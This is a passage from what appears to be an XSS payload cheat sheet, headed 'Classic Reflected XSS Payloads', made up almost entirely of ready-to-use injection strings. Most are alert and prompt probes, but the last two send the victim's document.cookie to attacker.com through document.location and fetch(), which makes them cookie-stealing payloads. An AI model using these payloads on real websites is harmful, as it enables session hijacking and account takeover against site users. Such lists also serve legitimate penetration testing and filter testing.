1. Classic Reflected XSS Payloads
These are the most common and basic types of XSS attacks where the payload is reflected off the web server.
Basic Payloads:
    "><script>alert(1)</script>
    "><img src=x onerror=alert(1)>
    "><svg/onload=alert(1)>
    "><script>prompt(1)</script>
    "><script>document.location='http://attacker.com/?data='+document.cookie</script>
    "><script>fetch('http://attacker.com/log.php?data='+document.cookie)</script>
